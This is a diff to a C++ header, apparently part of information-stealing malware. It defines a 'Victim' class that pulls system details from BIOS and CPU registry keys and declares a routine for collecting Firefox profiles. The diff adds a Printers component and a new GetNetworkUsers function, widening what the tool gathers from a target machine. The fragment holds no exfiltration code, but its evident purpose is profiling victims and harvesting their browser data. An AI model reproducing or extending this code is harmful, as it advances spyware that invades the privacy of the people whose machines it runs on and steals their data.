@@ -2,9 +2,10 @@
 #include "Registry.h"
 #include "Browsers.h"
 #include "Directories.h"
+#include "Printers.h"
 #pragma once
 
-class Victim : public Browsers, public Directories{
+class Victim : public Browsers, public Directories, public Printers {
 	//SYSTEM
 	std::string systemManu = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemManufacturer");
 	std::string systemProductName = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemProductName");
@@ -22,4 +23,5 @@ class Victim : public Browsers, public Directories{
 	Registers::Key CentralProcessorSubKeys = Registers::RegEnumSubKeys(HKEY_LOCAL_MACHINE, "Hardware\\Description\\System\\CentralProcessor");
 public:
 	bool GetFirefoxProfiles();
+	bool GetNetworkUsers();
 };
